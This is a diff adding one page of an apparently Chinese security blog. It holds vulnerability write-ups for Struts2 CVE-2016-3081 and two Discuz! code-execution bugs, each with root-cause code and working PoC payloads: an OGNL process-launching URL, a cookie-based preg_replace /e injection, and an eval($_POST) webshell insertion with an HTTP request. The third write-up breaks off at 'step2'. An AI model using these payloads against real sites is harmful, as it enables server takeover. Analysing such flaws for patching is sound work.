@@ -1,0 +1,2102 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="运维 | 安全 | 渗透">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Securitainment.io">
+<meta property="og:url" content="http://5cr1pt.github.io/blog.securitainment.io/page/2/index.html">
+<meta property="og:site_name" content="Securitainment.io">
+<meta property="og:description" content="运维 | 安全 | 渗透">
+<meta property="og:locale" content="default">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Securitainment.io">
+<meta name="twitter:description" content="运维 | 安全 | 渗透">
+
+
+
+
+
+
+  <link rel="canonical" href="http://5cr1pt.github.io/blog.securitainment.io/page/2/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Securitainment.io</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Securitainment.io</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-cve-2016-3081-struts2-detial/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jayce Links">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2016/05/14/2016-05-14-cve-2016-3081-struts2-detial/" class="post-title-link" itemprop="url">CVE-2016-3081_Struts2_detial</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2016-05-14 00:55:51" itemprop="dateCreated datePublished" datetime="2016-05-14T00:55:51+08:00">2016-05-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-12 16:30:50" itemprop="dateModified" datetime="2019-03-12T16:30:50+08:00">2019-03-12</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/2016/05/14/2016-05-14-cve-2016-3081-struts2-detial/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-cve-2016-3081-struts2-detial/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><p>2016年4月21日Struts2官方发布两个CVE，其中CVE-2016-3081官方评级为高。主要原因为在用户开启动态方法调用的情况下，会被攻击者实现远程代码执行攻击。从我自己搜索的情况来看，国内开启这个功能的网站不在少数，所以这个“Possible Remote Code Execution”漏洞的被打的可能性还是很高的。</p>
+<h1 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h1><p>直接进行版本比对，我们可以看到针对这个问题，只对DefaultActionMapper.java这个文件进行了修改，修改内容如下：</p>
+<p><img src="http://static.wooyun.org//drops/20160426/2016042610071380042.png" alt></p>
+<p>我们可以看到只是把method成员变量的值进行了一次过滤，cleanupActionName这个方法是在对“action:”滥用的问题进行添加的，禁止了绝大多数的特殊字符。但是在后来的版本变更中忽略了之前的问题，将method也引入了Ongl表达式，代码在DefaultAction.java的invokeAction中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">invokeAction</span><span class="params">(Object action, ActionConfig actionConfig)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String methodName = proxy.getMethod();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">        LOG.debug(<span class="string">"Executing action method = #0"</span>, methodName);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    String timerKey = <span class="string">"invokeAction: "</span> + proxy.getActionName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        UtilTimerStack.push(timerKey);</span><br><span class="line"> </span><br><span class="line">        Object methodResult;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            methodResult = ognlUtil.getValue(methodName + <span class="string">"()"</span>, getStack().getContext(), action);</span><br></pre></td></tr></table></figure>
+<p>我们可以看到methodName被带入到getValue了，熟悉Struts相关漏洞的朋友应该都明白这是什么意思，虽然后面被强制添加了一对圆括号，但是想办法语法补齐就好了。相对应的我们来看下在2.3.18版本之前的代码是怎么处理methodName的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">invokeAction</span><span class="params">(Object action, ActionConfig actionConfig)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String methodName = proxy.getMethod();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">        LOG.debug(<span class="string">"Executing action method = #0"</span>, methodName);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    String timerKey = <span class="string">"invokeAction: "</span> + proxy.getActionName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        UtilTimerStack.push(timerKey);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">boolean</span> methodCalled = <span class="keyword">false</span>;</span><br><span class="line">        Object methodResult = <span class="keyword">null</span>;</span><br><span class="line">        Method method = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method = getAction().getClass().getMethod(methodName, EMPTY_CLASS_ARRAY);</span><br></pre></td></tr></table></figure>
+<p>在这里使用的是反射，所以在这个漏洞发布的时候，我曾一瞬间觉得又是一个骗CVE的鸡肋，但是事实上，这是一个威胁很大的漏洞。但是官方说的受影响版本<code>Struts 2.0.0 - Struts Struts 2.3.28 (except 2.3.20.2 and 2.3.24.2)</code>是不严谨的，应该是<code>2.3.18-2.3.28(except 2.3.20.2 and 2.3.24.2)</code>。</p>
+<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h1><p>利用方式主要难点在于两个地方，一个是上文提到的对于表达式最后的圆括号给予正确的表达式意义。另一个就是在传输过程中method会经过一次转义，双引号和单引号的没有办法使用了，所以需要找到一个绕过。剩下的就是原来套沙盒绕过，命令执行的那套东西了。</p>
+<p>对于圆括号，可以直接使用<code>new java.lang.String</code>这样来拼接成<code>new java.lang.String()</code>构成正确Ognl语法。</p>
+<p>至于不能使用引号的话，命令执行我们可以使用引用参数的方法来完成对字符串的提取，例如：使用#parameters.cmd来提取http的cmd参数。测试PoC如下：</p>
+<blockquote>
+<p><a href="http://172.16.107.143:8080/Struts2_3_18/hello.action?cmd=gedit&amp;method:(%23_memberAccess).setExcludedClasses(@java.util.Collections@EMPTY_SET),(%23_memberAccess).setExcludedPackageNamePatterns(@java.util.Collections@EMPTY_SET),%23cmd%3d%23parameters.cmd,%23a%3dnew%20java.lang.ProcessBuilder(%23cmd).start().getInputStream(),new" target="_blank" rel="noopener">http://172.16.107.143:8080/Struts2_3_18/hello.action?cmd=gedit&amp;method:(%23_memberAccess).setExcludedClasses(@java.util.Collections@EMPTY_SET),(%23_memberAccess).setExcludedPackageNamePatterns(@java.util.Collections@EMPTY_SET),%23cmd%3d%23parameters.cmd,%23a%3dnew%20java.lang.ProcessBuilder(%23cmd).start().getInputStream(),new</a> java.lang.String</p>
+</blockquote>
+<p>效果如下图所示：</p>
+<p><img src="http://static.wooyun.org//drops/20160426/2016042610071333528.png" alt></p>
+<p>这里我小小的猜测一下，官方发布的日期是20，而漏洞提交team做宣传是在4月25日，那么是不是在提交CVE时还没有完成弹计算器的利用，还是为了符合漏洞提交规范做的延时？小八卦一下O(∩_∩)O。</p>
+<h1 id="0x03-漏洞总结"><a href="#0x03-漏洞总结" class="headerlink" title="0x03 漏洞总结"></a>0x03 漏洞总结</h1><p>虽然现在CVE已经发布，但是从目前网络情况上（twitter和微博）来看，并没有安全研究人员关注到这两个CVE，可能是因为官方发布过太多鸡肋的CVE了，国内的各路炒洞高手已经对Struts2麻木了。所以目前的情况是属于漏洞存在那里，发了CVE，但是没有任何人去研究利用，发布相关分析。这个漏洞和Struts2前N次被炒的热热闹闹的漏洞影响和危害相比，真是不可同日而语，这个漏洞真的很实在。</p>
+<p>看到这里，打算磨拳擦掌要去调回显PoC的朋友们，这里我要在提醒一次。虽然我在之前说了存在这个问题的站点很多，但是这个漏洞存在版本限制，在Struts2.3.18及其以上的版本才可以触发。而国内大多数的站点由于Struts在2.3.16之后再也没有出现过大的问题，所以绝大多数停留在2.3.16这个版本，这让这个看似很不错的漏洞略显鸡肋了。</p>
+<p><strong>防护方案</strong></p>
+<p>目前官方已经推出了<code>2.3.20.2、2.3.24.2</code>和<code>2.3.28.1</code>修复了这个问题，大家可以针对自己所使用的版本进行升级。下载地址：<a href="https://struts.apache.org/download.cgi#struts23281" target="_blank" rel="noopener">https://struts.apache.org/download.cgi#struts23281</a></p>
+<blockquote>
+<p>转自乌云：<br><a href="http://drops.wooyun.org/papers/15430" target="_blank" rel="noopener">http://drops.wooyun.org/papers/15430</a></p>
+</blockquote>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-discuz-6.x-7.x-REC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jayce Links">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2016/05/14/2016-05-14-discuz-6.x-7.x-REC/" class="post-title-link" itemprop="url">Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2016-05-14 00:54:00" itemprop="dateCreated datePublished" datetime="2016-05-14T00:54:00+08:00">2016-05-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-12 16:30:42" itemprop="dateModified" datetime="2019-03-12T16:30:42+08:00">2019-03-12</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/2016/05/14/2016-05-14-discuz-6.x-7.x-REC/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-discuz-6.x-7.x-REC/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<h2 id="Discuz-6-x-7-x-版本-前台任意代码执行漏洞"><a href="#Discuz-6-x-7-x-版本-前台任意代码执行漏洞" class="headerlink" title="Discuz! 6.x-7.x 版本 前台任意代码执行漏洞"></a>Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</h2><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞。</p>
+<p>include/global.func.php代码里：</p>
+<pre><code>&lt;code id=&quot;code0&quot;&gt;function daddslashes($string, $force = 0) {
+        !defined(&apos;MAGIC_QUOTES_GPC&apos;) &amp;&amp; define(&apos;MAGIC_QUOTES_GPC&apos;, get_magic_quotes_gpc());
+        if(!MAGIC_QUOTES_GPC || $force) {
+                if(is_array($string)) {
+                        foreach($string as $key =&gt; $val) {
+                                $string[$key] = daddslashes($val, $force);
+                        }
+                } else {
+                        $string = addslashes($string);
+                }
+        }
+        return $string;
+}&lt;/code&gt;
+</code></pre><p>include/common.inc.php里：</p>
+<pre><code>foreach(array(&apos;_COOKIE&apos;, &apos;_POST&apos;, &apos;_GET&apos;) as $_request) {
+        foreach($$_request as $_key =&gt; $_value) {
+                $_key{0} != &apos;_&apos; &amp;&amp; $$_key = daddslashes($_value);//变量引入000111222
+        }
+}
+</code></pre><p>模拟register_globals功能的代码,在GPC为off时会调用addslashes()函数处理变量值,但是如果直接使用$_GET/$_POST/$_COOKIE这样的变量,这个就不起作用了,然而dz的源码里直接使用$_GET/$_POST/$_COOKIE的地方很少,存在漏洞的地方更加少:(</p>
+<p>不过还有其他的绕过方法,在register_globals=on下通过提交GLOBALS变量就可以绕过上面的代码了.为了防止这种情况,dz中有如下代码:</p>
+<pre><code>if (isset($_REQUEST[&apos;GLOBALS&apos;]) OR isset($_FILES[&apos;GLOBALS&apos;])) {
+        exit(&apos;Request tainting attempted.&apos;);
+}
+</code></pre><p>这样就没法提交GLOBALS变量了么？</p>
+<p>$_REQUEST这个超全局变量的值受php.ini中request_order的影响,在最新的php5.3.x系列中,request_order默认值为GP,也就是说默认配置下$_REQUEST只包含$_GET和$_POST,而不包括$_COOKIE,那么我们就可以通过COOKIE来提交GLOBALS变量了:)</p>
+<h1 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h1><p>include/discuzcode.func.php</p>
+<pre><code>function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode = 1, $allowhtml = 0, $jammer = 0, $parsetype = &apos;0&apos;, $authorid = &apos;0&apos;, $allowmediacode = &apos;0&apos;, $pid = 0) {
+        global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowattachurl;
+        if($parsetype != 1 &amp;&amp; !$bbcodeoff &amp;&amp; $allowbbcode &amp;&amp; (strpos($message, &apos;[ /code]&apos;) || strpos($message, &apos;[ /CODE]&apos;)) !== FALSE) {
+                $message = preg_replace(&quot;/\s?\[code\](.+?)\[\/code\]\s?/ies&quot;, &quot;codedisp(&apos;\\1&apos;)&quot;, $message);
+        }
+        $msglower = strtolower($message);
+        //$htmlon = $htmlon &amp;&amp; $allowhtml ? 1 : 0;
+        if(!$htmlon) {
+                $message = $jammer ? preg_replace(&quot;/\r\n|\n|\r/e&quot;, &quot;jammer()&quot;, dhtmlspecialchars($message)) : dhtmlspecialchars($message);
+        }
+        if(!$smileyoff &amp;&amp; $allowsmilies &amp;&amp; !empty($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;]) &amp;&amp; is_array($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;])) {
+                if(!$discuzcodes[&apos;smiliesreplaced&apos;]) {
+                        foreach($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;] AS $key =&gt; $smiley) {
+                                $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;][$key] = &apos;&lt;img src=&quot;images/smilies/&apos;.$GLOBALS[&apos;_DCACHE&apos;][&apos;smileytypes&apos;][$GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;typearray&apos;][$key]][&apos;directory&apos;].&apos;/&apos;.$smiley.&apos;&quot; smilieid=&quot;&apos;.$key.&apos;&quot; border=&quot;0&quot; alt=&quot;&quot; /&gt;&apos;;
+                        }
+                        $discuzcodes[&apos;smiliesreplaced&apos;] = 1;
+                }
+        $message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);
+        }
+        ......
+</code></pre><p>119行 ：</p>
+<pre><code>$message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);  //让 preg_replace 加上/e 修正符，产生代码执行
+</code></pre><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>访问一个存在的帖子，需要访问的页面有表情。<br>例如：<a href="http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1" target="_blank" rel="noopener">http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1</a><br>然后刷新帖子，拦截数据包，cookie中添加</p>
+<pre><code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+</code></pre><p>如有漏洞，即可看到效果.<br>写个shell 自然也不是问题了~</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><img src="https://www.t00ls.net/attachments/month_1411/1411232121316afb1fac2c2397.jpg" alt></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-discuz-admin_styles.inc.php-get-webshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jayce Links">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2016/05/14/2016-05-14-discuz-admin_styles.inc.php-get-webshell/" class="post-title-link" itemprop="url">Discuz! admin_styles.inc.php get-webshell bug</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2016-05-14 00:53:06" itemprop="dateCreated datePublished" datetime="2016-05-14T00:53:06+08:00">2016-05-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-12 16:30:34" itemprop="dateModified" datetime="2019-03-12T16:30:34+08:00">2019-03-12</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/2016/05/14/2016-05-14-discuz-admin_styles.inc.php-get-webshell/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-discuz-admin_styles.inc.php-get-webshell/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<h1 id="Discuz-admin-styles-inc-php-get-webshell-bug"><a href="#Discuz-admin-styles-inc-php-get-webshell-bug" class="headerlink" title="Discuz! admin_styles.inc.php get-webshell bug"></a>Discuz! admin_styles.inc.php get-webshell bug</h1><pre><code>author: ring04h
+team:http://www.80vul.com
+</code></pre><p>由于Discuz!的admin\styles.inc.php里preg_match正则判断$newcvar变量操作不够严谨，导致执行代码漏洞.</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>在文件admin\styles.inc.php里代码:</p>
+<pre><code>if($newcvar &amp;&amp; $newcsubst) {
+    if($db-&gt;result_first(&quot;SELECT COUNT(*) FROM {$tablepre}stylevars WHERE variable=&apos;$newcvar&apos; AND styleid=&apos;$id&apos;&quot;)) {
+        cpmsg(&apos;styles_edit_variable_duplicate&apos;, &apos;&apos;, &apos;error&apos;);
+    } elseif(!preg_match(&quot;/[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*/&quot;, $newcvar)) {
+        cpmsg(&apos;styles_edit_variable_illegal&apos;, &apos;&apos;, &apos;error&apos;);
+    }
+    $newcvar = strtolower($newcvar);
+    $db-&gt;query(&quot;INSERT INTO {$tablepre}stylevars (styleid, variable, substitute)
+        VALUES (&apos;$id&apos;, &apos;$newcvar&apos;, &apos;$newcsubst&apos;)&quot;);
+}
+</code></pre><p>上面代码可以看出来当有后台权限时,可通过编辑风格,自定义模板变量处插入</p>
+<pre><code>&lt;strong&gt; !&apos;,&apos;80VUL&apos;);EVAL(
+___FCKpd___0
+
+POST[RING]);// &lt;/strong&gt;
+</code></pre><p>替换出插入 exp by ring04h!，远程写入webshell执行代码.</p>
+<h1 id="利用POC"><a href="#利用POC" class="headerlink" title="利用POC"></a>利用POC</h1><p>step1：</p>
+<pre><code>POST /bbs/admincp.php?action=styles HTTP/1.1
+Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/vnd.ms-xpsdocument, application/xaml+xml, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Referer: http://www.80vul.com/bbs/admincp.php?action=styles
+Accept-Language: zh-cn
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+Host: www.80vul.com
+Content-Length: 154
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: 
+
+formhash=99238f2d&amp;anchor=&amp;updatecsscache=0&amp;namenew%5B1%5D=%C4%AC%C8%CF%B7%E7%B8%F1&amp;availablenew%5B1%5D=1&amp;defaultnew=1&amp;newname=exp&amp;stylesubmit=%CC%E1%BD%BB
+</code></pre><p>step2:</p>
